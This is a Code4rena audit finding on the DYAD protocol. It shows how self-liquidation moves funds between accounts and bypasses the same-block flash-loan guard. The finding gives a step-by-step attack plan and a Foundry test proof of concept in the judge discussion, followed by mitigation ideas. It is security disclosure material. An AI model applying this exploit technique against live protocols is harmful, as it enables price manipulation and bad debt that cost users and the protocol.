---
tags:
  - lang/move
  - lang/solidity
  - sector/cdp
  - sector/lending
  - sector/nft
  - sector/nft-lending
  - sector/oracle
  - sector/stable
  - sector/staking
  - sector/token
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - impact/data-corruption/price-manipulation
  - trigger/flash-loan
  - trigger/price-manipulation
  - precondition/flash-loan-available
protocol: "[[DYAD]]"
auditors:
  - "[[carrotsmuggler]]"
report: "https://code4rena.com/reports/2024-04-dyad"
genome:
  - "[[spot-price]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[flash-loan]]"
  - "[[trigger/price-manipulation]]"
  - "[[flash-loan-available]]"
  - "[[debt-accrual-update]]"
  - "[[flashloan-callback-auth]]"
  - "[[liquidation-underwater]]"
  - "[[frontrun-exposure]]"
  - "[[oracle-manipulation-resistance]]"
---
# [H-10] Flash loan protection mechanism can be bypassed via self-liquidations

- id: 33466
- impact: HIGH
- protocol: [[DYAD]]
- reporter: carrotsmuggler (Code4rena)
- source: https://code4rena.com/reports/2024-04-dyad

## Summary


This bug report discusses an issue with the flash-loan manipulation protection mechanism in the DYAD protocol. The mechanism is designed to prevent users from taking out a flashloan and manipulating the system to their advantage. However, the report shows that this protection can be bypassed by using liquidations to transfer funds between accounts without updating the necessary variables. This allows a user to artificially inflate the price of kerosene, manipulate their collateralization ratio, and ultimately accrue bad debt in the system. The report includes a proof of concept that demonstrates how this can be done using multiple accounts and flashloans. The severity of this issue is debated among the developers, but it is ultimately classified as a high severity issue due to the potential for mass liquidations and the fact that it bypasses a key safeguard put in place by the developers. Mitigation steps suggested include making kerosene less manipulatable and incorporating a mint fee to make this attack vector less accessible. 

## Details


<https://github.com/code-423n4/2024-04-dyad/blob/44becc2f09c3a75bd548d5ec756a8e88a345e826/src/core/Vault.kerosine.sol#L47-L59>

<https://github.com/code-423n4/2024-04-dyad/blob/44becc2f09c3a75bd548d5ec756a8e88a345e826/src/core/VaultManagerV2.sol#L225-L226>

### Impact

The protocol implements a flash-loan manipulation protection mechanism with the `idToBlockOfLastDeposit` variable. This values is set to the current block number during a deposit, and is checked during a withdrawal. If the system detects a deposit and withdrawal in the same block, the system reverts the transaction.

```solidity
//function deposit
idToBlockOfLastDeposit[id] = block.number;

//function withdraw
if (idToBlockOfLastDeposit[id] == block.number) revert DepositedInSameBlock();
```

The issue is that there is another way to move funds around: liquidations. This calls the `move` function to transfer around the balances, and does not update the `idToBlockOfLastDeposit` of the receiving account.

```solidity
 function liquidate(
    uint id,
    uint to
  )
  {
    //...
    vault.move(id, to, collateral);
    //...
  }
```

So, a user can:

1. Take out a flashloan. Deposit funds into a vault A. Mint dyad.
2. Manipulate the price of kerosene to trigger a liquidation.
3. Liquidate themselves and send their collateral to vault B.
4. Withdraw from vault B in the same block.
5. Pay off their flashloans.

The step 2 involves manipulating the price of kerosene, which affects their collateralization ratio. This has been discussed in a separate issue, and mainly states that if the user mints more dyad against free collateral in the system, or if any user takes out free collateral in the system, the price of kerosene will fall.

The flaw being discussed in this report is that the flash loan protection mechanism can be bypassed. This is different from the price manipulation issue and is thus a separate issue. Since this bypasses one of the primary safeguards in the system, this is a high severity issue.

### Proof of Concept

The POC exploit setup requires 4 accounts: A, B, C and D:
- A is where the flashed funds will be deposited to.
- B is where the liquidated funds will be deposited to.
- C is for manipulating the kerosene price.
- D is for minting dyad at manipulated price to accrue bad debt in the system.

Where:

A is used to **inflate** the price of kerosene.<br>
B is used to bypass the flash loan protection mechanism.<br>
C is used to **deflate** the price of kerosene.<br>
D is used to mint dyad at the **inflated** price, accruing bad debt in the system and damaging the protocol.

1. Assume C has 1 million usdc tokens with `0` debt. C inflates the price of kerosene up by contributing to TVL, and will be used later to push the price down.
2. Alice takes out a flashloan of 10 million usdc tokens. She deposits them in account A.
3. Due to the sudden added **massive** flashloaned TVL, the internal price of kerosene shoots up.
4. Alice uses account D to mint out dyad tokens at this condition. Alice can now mint out exactly as many dyad tokens as her exo collateral. This is allowed since the price of kerosene is inflated, which covers the collateralization ratio. Alice effectively has a CR of close to 1.0 but the system thinks it's 1.5 due to kerosene being overvalued. The system is still solvent at this point.
5. Alice buys kerosene from the market and adds it in account A and then mints dyad until account A has a CR of 1.5. The actual CR of A ignoring kerosene is close to 1.0.
6. Alice now removes collateral from account C. This reduces the price of C, making Account A liquidatable.
7. Alice now liquidates account A and sends the collateral to account B. This inflates the price of kerosene again since dyad supply has gone down, and she can repeat steps 5-6 multiple times since she can now mint more dyad tokens again.
8. Alice gets a large portion of her flashed funds into account B She withdraws them back out. This again drops the price of kerosene, allowing her to liquidate A more and and recover more of her funds into account B.
9. Alice pays back her flashloan.
10. Account D is now left with a CR close to 1.0, since the price of kerosene has now gone back to normal. Any price fluctuations in the exo collateral will now lead to bad debt.

This lets Alice open positions at a CR of close to 1.0. This is very dangerous in a CDP protocol, since Alice's risk is very low as she can sell off the minted dyad to recover her investment, but the protocol is now at a very risky position, close to accruing bad debt. Thus this is a high severity issue.

### Recommended Mitigation Steps

The flashloan protection can be bypassed. MEV liquidation bots rely on flashloans to carryout liquidations, so there isn't a very good way to prevent this attack vector. Making the price of kerosene less manipulatable is a good way to lower this attack chance. However, the system will still be open to flashloan deposits via liquidations.

Incorporating a mint fee will also help mitigate this vector, since the attacker will have a higher cost to manipulate the system.

**[shafu0x (DYAD) confirmed](https://github.com/code-423n4/2024-04-dyad-findings/issues/68#event-12659937331)**

**[Koolex (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-04-dyad-findings/issues/68#issuecomment-2094809101):**
 > @carrotsmuggler - the attack assumes that kerosine is used within the CR. Could you please clarify how the attacker would acquire this big amount of kerosine?

**[carrotsmuggler (warden) commented](https://github.com/code-423n4/2024-04-dyad-findings/issues/68#issuecomment-2094811077):**
 > @Koolex - kerosene can just be bought off of DEXs and other open markets. In this attack, kerosene is not being flashloaned. Kerosene is just required as an initial investment. USDC is flashloaned, and dyad tokens are minted against that up to a CR of 1.5, which drops to 1.0 once the value of kerosene drops.
> 
> The point of the issue is to show that the flashloan protection can be bypassed, which is being done here by utilising multiple accounts. 

**[Koolex (judge) commented](https://github.com/code-423n4/2024-04-dyad-findings/issues/68#issuecomment-2094847169):**
 > @carrotsmuggler - I'm requesting a PoC (with code) in order to be able to evaluate the severity better. At the moment, the attack is too expensive since the attacker should hold a big amount of Kerosene, which practically difficult since  Kerosene is being distributed over 10 years. Unless there is a demonstrated impact on the protocol, this would be a QA.

**[carrotsmuggler (warden) commented](https://github.com/code-423n4/2024-04-dyad-findings/issues/68#issuecomment-2118086033):**
 > The problem this issue addresses, is that the flash loan protection can be bypassed. For that, a POC is taken from the issue [#537](https://github.com/code-423n4/2024-04-dyad-findings/issues/537) showing that self liquidation can be used to flash funds, manipulate the system, and then take them out in the same transaction.
> 
> However, the main point of contention here seems to be the impact. Flashloans in general don't do anything a well funded attacker cannot do on their own, and not an exploit on their own. However, they can be used to exacerbate an existing problem by anyone, well funded or not.
> 
> To eradicate this vector, and to make the system less manipulatable, the devs had put in certain restrictions. This issue shows that these restrictions are insufficient. So users can use flashloans and thus a near infinite amount of funds to manipulate the system. This was reported since the devs had explicitly put up a counter to this.
> 
> Since this breaks the safeguards put in place by the devs and makes the system more easily manipulatable, I believe this is of medium severity. This can be used in [#67](https://github.com/code-423n4/2024-04-dyad-findings/issues/67), but should not be a duplicate. This can also be abused to mint positions at 100% CR instead of 150% with a very large volume by anyone due to the flashloans, which makes the system way more unstable. Even small changes in price at that condition will be enough to cause bad debt to the system then.
> 
> <details>
>
> ```solidity
> // SPDX-License-Identifier: MIT
> pragma solidity =0.8.17;
> 
> import "forge-std/Test.sol";
> import "forge-std/console.sol";
> import {DeployBase, Contracts} from "../script/deploy/DeployBase.s.sol";
> import {Parameters} from "../src/params/Parameters.sol";
> import {DNft} from "../src/core/DNft.sol";
> import {Dyad} from "../src/core/Dyad.sol";
> import {Licenser} from "../src/core/Licenser.sol";
> import {VaultManagerV2} from "../src/core/VaultManagerV2.sol";
> import {Vault} from "../src/core/Vault.sol";
> import {OracleMock} from "./OracleMock.sol";
> import {ERC20Mock} from "./ERC20Mock.sol";
> import {IAggregatorV3} from "../src/interfaces/IAggregatorV3.sol";
> import {ERC20} from "@solmate/src/tokens/ERC20.sol";
> 
> import {KerosineManager}        from "../src/core/KerosineManager.sol";
> import {UnboundedKerosineVault} from "../src/core/Vault.kerosine.unbounded.sol";
> import {BoundedKerosineVault}   from "../src/core/Vault.kerosine.bounded.sol";
> import {Kerosine}               from "../src/staking/Kerosine.sol";
> import {KerosineDenominator}    from "../src/staking/KerosineDenominator.sol";
> 
> contract VaultManagerV2Test is Test, Parameters {
>   DNft         dNft;
>   Licenser     vaultManagerLicenser;
>   Licenser     vaultLicenser;
>   Dyad         dyad;
>   VaultManagerV2 vaultManagerV2;
>  
> 
>   // weth
>   Vault        wethVault;
>   ERC20Mock    weth;
>   OracleMock   wethOracle;
> 
>   //Kerosine
>   Kerosine kerosine;
>   UnboundedKerosineVault unboundedKerosineVault;
> 
>   KerosineManager        kerosineManager;
>   KerosineDenominator    kerosineDenominator;
>   
>   //users
>   address user1;
>   address user2;
> 
>   function setUp() public {
>     dNft       = new DNft();
>     weth       = new ERC20Mock("WETH-TEST", "WETHT");
>     wethOracle = new OracleMock(3000e8);
> 
>     vaultManagerLicenser = new Licenser();
>     vaultLicenser        = new Licenser();
> 
>     dyad   = new Dyad(vaultManagerLicenser);
> 
>     //vault Manager V2
>     vaultManagerV2    = new VaultManagerV2(
>         dNft,
>         dyad,
>         vaultLicenser
>       );
> 
>     //vault
>        wethVault                   = new Vault(
>         vaultManagerV2,
>         ERC20(address(weth)),
>         IAggregatorV3(address(wethOracle))
>       );
> 
>     //kerosineManager
>     kerosineManager = new KerosineManager();
>     kerosineManager.add(address(wethVault));
> 
>     vaultManagerV2.setKeroseneManager(kerosineManager);
> 
>     //kerosine token
>     kerosine = new Kerosine();
>     //Unbounded KerosineVault
>     unboundedKerosineVault = new UnboundedKerosineVault(
>       vaultManagerV2,
>       kerosine, 
>       dyad,
>       kerosineManager
>     );
>     
> 
>     //kerosineDenominator
>     kerosineDenominator       = new KerosineDenominator(
>       kerosine
>     );
>     unboundedKerosineVault.setDenominator(kerosineDenominator);
> 
>     //Licenser add vault
>     vaultLicenser.add(address(wethVault));
>     vaultLicenser.add(address(unboundedKerosineVault));
> 
>     //vaultManagerLicenser add manager
>     vaultManagerLicenser.add(address(vaultManagerV2));
> 
>   }
> 
> function testFlashLoanAttackUsingLiquidateSimulation() public{
>     wethOracle.setPrice(1000e8);
>     //1 The attacker prepares two NFTs ,some collateral and some Kerosene Token.
>     uint id = mintDNft();
>     uint id_for_liquidator = mintDNft();
>     weth.mint(address(this), 1e18);
> 
>     //2 deposit all the non-Kerosene collateral in the vault with One NFT like id=1 
>     vaultManagerV2.add(id_for_liquidator, address(wethVault));
>     weth.approve(address(vaultManagerV2), 1e18);
>     vaultManagerV2.deposit(id_for_liquidator, address(wethVault), 1e18);
> 
>     //3 In the next blocknumber, flashloan non-Kerosene collateral from Lending like Aave,
>     vm.roll(block.number + 1);
>     weth.mint(address(this), 1e18);//Simulation borrow 1 weth
> 
>     //deposit all the borrowed flashloan non-Kerosene collateral and Kerosene Token in the vault with One NFT like id=0
>     vaultManagerV2.add(id, address(wethVault));
>     weth.approve(address(vaultManagerV2), 1e18);
>     vaultManagerV2.deposit(id, address(wethVault), 1e18);
> 
>     vaultManagerV2.addKerosene(id, address(unboundedKerosineVault));
>     kerosine.approve(address(vaultManagerV2), 1000_000_000e18);
>     vaultManagerV2.deposit(id, address(unboundedKerosineVault), 1000_000_000e18);
> 
>     //Mint the max number Dyad you can
>     vaultManagerV2.mintDyad(id, 1000e18, address(this));
>     uint256 cr = vaultManagerV2.collatRatio(id); //2e18
>     assertEq(cr, 2e18);
> 
>     //withdraw using id_for_liquidator,  manipulate the  Kerosene price
>     vaultManagerV2.withdraw(id_for_liquidator, address(wethVault), 1e18, address(this));
>     cr = vaultManagerV2.collatRatio(id); //1e18
>     assertEq(cr, 1e18);
>     //liquidate
>     vaultManagerV2.liquidate(id, id_for_liquidator);
>     //withdraw the vault which is move from id  using id_for_liquidator
>     vaultManagerV2.withdraw(id_for_liquidator, address(wethVault), 1e18, address(this));
>     console.log("weth balance is ", weth.balanceOf(address(this))/1e18);
> }
> 
>   function mintDNft() public returns (uint) {
>     return dNft.mintNft{value: 1 ether}(address(this));
>   }
> 
>  function deposit(
>     ERC20Mock token,
>     uint      id,
>     address   vault,
>     uint      amount
>   ) public {
>     vaultManagerV2.add(id, vault);
>     token.mint(address(this), amount);
>     token.approve(address(vaultManagerV2), amount);
>     vaultManagerV2.deposit(id, address(vault), amount);
>   }
> 
>   receive() external payable {}
> 
>   function onERC721Received(
>     address,
>     address,
>     uint256,
>     bytes calldata
>   ) external pure returns (bytes4) {
>     return 0x150b7a02;
>   }
> }
> ```
> </details>
>

**[adam-idarrha (warden) commented](https://github.com/code-423n4/2024-04-dyad-findings/issues/68#issuecomment-2118214281):**
 > For the impact the sponsors stated quite clearly from the DYAD code4rena audit page that the main point of migrating from `vaultManagerV1` to `V2` is the need for a flashloan protection mechanism, and the impact of the bypass is the ability to manipulate kerosene price which could lead to mass liquidations as discussed in separate issues:
> 
> > Attack ideas (where to focus for bugs).<br>
> > Manipulation of Kerosene Price.<br>
> > Flash Loan attacks. <br>
> > Migration.
> 
> > The goal is to migrate from `VaultManager` to `VaultManagerV2`. The main reason is the need for a flash loan protection which makes it harder to manipulate the deterministic Kerosene price.

**[Koolex (judge) increased severity to High and commented](https://github.com/code-423n4/2024-04-dyad-findings/issues/68#issuecomment-2134814911):**
 > After reading all the comments above, I believe this should be a valid high due to the following reasons:
> - Flash loan protection can be bypassed, since this didn't exist in V1, it seems to me, it is a major change in V2.
> - Price manipulation impact is demonstrated above, which is caused by utilising Flash loans.
> - Flash loan attacks mentioned under Attack ideas of the audit page, obviously, the sponsor is interested in breaking this validation put in place.
> - Not a dup of [#67](https://github.com/code-423n4/2024-04-dyad-findings/issues/67)
>   - 67's attack is less accessible unlike with Flash loans where anyone can perform it. 
>   - Furthermore, 67 isn’t necessarily to be performed as an attack, the event could occur naturally when whales intend to withdraw funds.

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-04-dyad-findings/issues/68).*

***
